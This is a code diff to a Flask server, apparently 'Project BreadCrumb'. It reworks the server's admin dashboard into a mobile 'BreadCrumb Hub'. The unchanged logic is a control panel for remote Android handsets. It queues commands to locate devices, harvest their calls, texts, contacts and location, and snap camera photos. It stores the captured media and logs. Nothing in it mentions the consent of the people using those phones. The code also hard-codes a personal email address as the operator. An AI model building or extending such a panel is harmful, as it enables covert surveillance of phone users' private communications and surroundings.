@@ -9,7 +9,7 @@ CLOUD_DB = "cloud_relay.db"
 UPLOAD_FOLDER = "media_vault_storage"
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# SECURE: Pulled strictly from environment variables without plain-text fallbacks
+# SECURE: Pulled strictly from environment variables
 MASTER_USER = os.environ.get("MASTER_USER")
 MASTER_PASS_HASH = os.environ.get("MASTER_PASS_HASH")
 
@@ -61,120 +61,117 @@ def init_cloud_db():
 
 init_cloud_db()
 
-FORENSIC_ADMIN_TEMPLATE = """
+MOBILE_ADMIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Project BreadCrumb - Forensic & Media Vault</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BreadCrumb Control Center</title>
     <style>
-        :root { --bg: #121212; --card: #1e1e1e; --primary: #bb86fc; --text: #e0e0e0; --accent: #03dac6; --danger: #cf6679; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
-        .container { max-width: 1100px; margin: auto; }
-        .card { background: var(--card); border-radius: 8px; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
-        h2, h3 { color: var(--primary); margin-top: 0; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
-        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
-        th { color: var(--accent); }
-        pre { background: #000; padding: 10px; border-radius: 4px; color: #03dac6; max-height: 150px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 6px 10px; border-radius: 4px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; font-size: 11px; }
+        :root { --bg: #121212; --card: #1e1e1e; --primary: #bb86fc; --text: #e0e0e0; --accent: #03dac6; --danger: #cf6679; --border: #333; }
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 10px; font-size: 14px; }
+        .container { width: 100%; max-width: 600px; margin: auto; }
+        .card { background: var(--card); border-radius: 10px; padding: 15px; margin-bottom: 15px; border: 1px solid var(--border); box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+        h2 { color: var(--primary); font-size: 18px; margin: 0 0 5px 0; }
+        h3 { color: var(--accent); font-size: 15px; margin: 0 0 10px 0; border-bottom: 1px solid var(--border); padding-bottom: 5px; }
+        p { margin: 5px 0; color: #aaa; font-size: 12px; }
+        .device-box { background: #252525; border-radius: 8px; padding: 12px; margin-bottom: 10px; border: 1px solid #444; }
+        .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .badge { background: var(--accent); color: #000; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; }
+        .btn-group { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 12px; flex: 1; text-align: center; min-width: 75px; }
         .btn-danger { background: var(--danger); color: #fff; }
         .btn-accent { background: var(--accent); color: #000; }
-        .media-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
-        .media-thumb { background: #000; border: 1px solid #444; border-radius: 4px; padding: 5px; text-align: center; }
-        .media-thumb img { max-width: 120px; max-height: 120px; display: block; border-radius: 2px; margin-bottom: 5px; }
+        pre { background: #000; padding: 8px; border-radius: 4px; color: var(--accent); max-height: 120px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; margin: 5px 0; }
+        .media-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+        .media-thumb { background: #000; border: 1px solid #444; border-radius: 6px; padding: 4px; text-align: center; }
+        .media-thumb img, .media-thumb video { width: 100%; height: 75px; object-fit: cover; border-radius: 4px; display: block; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="card">
-            <h2>Project BreadCrumb Forensic Vault</h2>
-            <p>Master Dispatch & Evidence Extraction Hub</p>
-            <a href="/logout" class="btn btn-danger" style="float: right; margin-top: -45px;">Logout</a>
+        <div class="card top-bar">
+            <div>
+                <h2>BreadCrumb Hub</h2>
+                <p>Mobile Command & Recovery</p>
+            </div>
+            <a href="/logout" class="btn btn-danger" style="flex: none; padding: 6px 12px;">Logout</a>
         </div>
 
         <div class="card">
-            <h3>Registered Protected Handsets</h3>
-            <table>
-                <tr>
-                    <th>IMEI / ID</th>
-                    <th>Hardware & Profile</th>
-                    <th>Owner</th>
-                    <th>Status</th>
-                    <th>Commands</th>
-                </tr>
-                {% for dev in devices %}
-                <tr>
-                    <td><code>{{ dev[0] }}</code></td>
-                    <td><b>{{ dev[1] }}</b></td>
-                    <td>{{ dev[2] }}<br><span style="color: #888; font-size: 10px;">{{ dev[3] }}</span></td>
-                    <td style="color: var(--accent); font-weight: bold;">{{ dev[7] }}</td>
-                    <td>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="LOCATE">
-                            <button type="submit" class="btn btn-accent">📍 Locate</button>
-                        </form>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="HARVEST_FORENSICS">
-                            <button type="submit" class="btn">🕵️ Harvest Logs</button>
-                        </form>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="SNAP">
-                            <button type="submit" class="btn">📸 Snap</button>
-                        </form>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="ALARM">
-                            <button type="submit" class="btn btn-danger">🚨 Alarm</button>
-                        </form>
-                    </td>
-                </tr>
-                {% else %}
-                <tr><td colspan="5" style="text-align: center; color: #777;">No active devices synced.</td></tr>
-                {% endfor %}
-            </table>
+            <h3>📱 Managed Handsets</h3>
+            {% for dev in devices %}
+            <div class="device-box">
+                <div class="device-header">
+                    <b style="font-size: 13px; color: #fff;">{{ dev[1] }}</b>
+                    <span class="badge">{{ dev[7] }}</span>
+                </div>
+                <p><b>ID / IMEI:</b> <code>{{ dev[0] }}</code></p>
+                <p><b>Owner:</b> {{ dev[2] }} ({{ dev[3] }})</p>
+                <div class="btn-group">
+                    <form method="POST" action="/api/queue-command" style="flex:1;">
+                        <input type="hidden" name="imei" value="{{ dev[0] }}">
+                        <input type="hidden" name="command" value="LOCATE">
+                        <button type="submit" class="btn btn-accent">📍 Locate</button>
+                    </form>
+                    <form method="POST" action="/api/queue-command" style="flex:1;">
+                        <input type="hidden" name="imei" value="{{ dev[0] }}">
+                        <input type="hidden" name="command" value="HARVEST_FORENSICS">
+                        <button type="submit" class="btn">🕵️ Logs</button>
+                    </form>
+                    <form method="POST" action="/api/queue-command" style="flex:1;">
+                        <input type="hidden" name="imei" value="{{ dev[0] }}">
+                        <input type="hidden" name="command" value="SNAP">
+                        <button type="submit" class="btn">📸 Snap</button>
+                    </form>
+                    <form method="POST" action="/api/queue-command" style="flex:1;">
+                        <input type="hidden" name="imei" value="{{ dev[0] }}">
+                        <input type="hidden" name="command" value="ALARM">
+                        <button type="submit" class="btn btn-danger">🚨 Alarm</button>
+                    </form>
+                </div>
+            </div>
+            {% else %}
+            <p style="text-align: center; color: #777;">No active devices synced.</p>
+            {% endfor %}
         </div>
 
         <div class="card">
-            <h3>📸 Captured Media Vault</h3>
+            <h3>📸 Media & Video Vault</h3>
             <div class="media-grid">
                 {% for item in media_items %}
                 <div class="media-thumb">
                     <a href="/media/{{ item[2] }}" target="_blank">
-                        <img src="/media/{{ item[2] }}" alt="Evidence">
+                        {% if item[2].endswith('.mp4') or item[2].endswith('.mov') %}
+                        <video src="/media/{{ item[2] }}"></video>
+                        {% else %}
+                        <img src="/media/{{ item[2] }}" alt="Vault Media">
+                        {% endif %}
                     </a>
-                    <span style="font-size: 10px; color: #aaa;">{{ item[1] }}<br>{{ item[3] }}</span>
+                    <span style="font-size: 9px; color: #aaa; display:block; overflow:hidden; text-overflow: ellipsis; white-space: nowrap;">{{ item[3] }}</span>
                 </div>
                 {% else %}
-                <p style="color: #777; font-size: 12px;">No media captured yet.</p>
+                <p style="color: #777; font-size: 11px; grid-column: span 3; text-align: center;">No media captured yet.</p>
                 {% endfor %}
             </div>
         </div>
 
         <div class="card">
-            <h3>Harvested Forensic Intelligence (Calls, Texts, Contacts, Location)</h3>
-            <table>
-                <tr>
-                    <th>Timestamp</th>
-                    <th>IMEI</th>
-                    <th>Data Category</th>
-                    <th>Extracted Content</th>
-                </tr>
-                {% for log in forensic_logs %}
-                <tr>
-                    <td>{{ log[4] }}</td>
-                    <td><code>{{ log[1] }}</code></td>
-                    <td><b>{{ log[2] }}</b></td>
-                    <td><pre>{{ log[3] }}</pre></td>
-                </tr>
-                {% else %}
-                <tr><td colspan="4" style="text-align: center; color: #777;">No forensic logs harvested yet. Click "Harvest Logs" above.</td></tr>
-                {% endfor %}
-            </table>
+            <h3>🕵️ Forensic Intelligence Logs</h3>
+            {% for log in forensic_logs %}
+            <div style="background: #161616; padding: 8px; border-radius: 6px; margin-bottom: 8px; border: 1px solid #282828;">
+                <div style="display: flex; justify-content: space-between; font-size: 10px; color: #888;">
+                    <span><b>{{ log[2] }}</b> (<code>{{ log[1] }}</code>)</span>
+                    <span>{{ log[4] }}</span>
+                </div>
+                <pre>{{ log[3] }}</pre>
+            </div>
+            {% else %}
+            <p style="text-align: center; color: #777;">No forensic logs harvested yet.</p>
+            {% endfor %}
         </div>
     </div>
 </body>
@@ -184,20 +181,27 @@ FORENSIC_ADMIN_TEMPLATE = """
 LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
-<head><title>Master Login</title>
-<style>
-body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 300px; border: 1px solid #333; }
-input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
-button { background: #bb86fc; color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
-</style></head>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Master Login</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 15px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; width: 100%; max-width: 320px; border: 1px solid #333; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; font-size: 14px; }
+        button { background: #bb86fc; color: #000; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; font-size: 14px; }
+    </style>
+</head>
 <body>
-<div class="card"><h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
-<form method="POST">
-<input type="text" name="username" placeholder="Username" required>
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">Access Portal</button>
-</form></div></body></html>
+    <div class="card">
+        <h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Access Portal</button>
+        </form>
+    </div>
+</body>
+</html>
 """
 
 @app.route('/', methods=['GET', 'POST'])
@@ -220,13 +224,13 @@ def cloud_dashboard():
     cursor = conn.cursor()
     cursor.execute("SELECT imei, make_model, owner_name, owner_email, unlock_credentials, verified, last_seen, status, device_profile FROM registered_devices")
     devices = cursor.fetchall()
-    cursor.execute("SELECT id, imei, data_type, content, timestamp FROM forensic_logs ORDER BY timestamp DESC LIMIT 50")
+    cursor.execute("SELECT id, imei, data_type, content, timestamp FROM forensic_logs ORDER BY timestamp DESC LIMIT 25")
     forensic_logs = cursor.fetchall()
-    cursor.execute("SELECT id, imei, filename, timestamp FROM media_vault ORDER BY timestamp DESC")
+    cursor.execute("SELECT id, imei, filename, timestamp FROM media_vault ORDER BY timestamp DESC LIMIT 15")
     media_items = cursor.fetchall()
     conn.close()
 
-    return render_template_string(FORENSIC_ADMIN_TEMPLATE, devices=devices, forensic_logs=forensic_logs, media_items=media_items)
+    return render_template_string(MOBILE_ADMIN_TEMPLATE, devices=devices, forensic_logs=forensic_logs, media_items=media_items)
 
 @app.route('/logout')
 def logout():
@@ -242,13 +246,13 @@ def serve_media(filename):
 def api_sync():
     data = request.json or {}
     imei = data.get("imei")
-    if not imei: return jsonify({"error": "Missing IMEI"}), 400
+    if not imei: return jsonify({"error": "Missing IMEI or Device ID"}), 400
     conn = sqlite3.connect(CLOUD_DB)
     cursor = conn.cursor()
     cursor.execute('''
         INSERT OR REPLACE INTO registered_devices (imei, make_model, owner_name, owner_email, unlock_credentials, verified, status, device_profile)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    ''', (imei, data.get("make_model", "Android Agent"), "Master Operator", "jeanmichelleledeoux@gmail.com", "Set", 1, "Online", "Baseline Node"))
+    ''', (imei, data.get("make_model", "Android Agent"), "Master Operator", "jeanmichelleledeoux@gmail.com", "Set", 1, "Online", "Mobile Node"))
     conn.commit()
     conn.close()
     return jsonify({"status": "synced"})
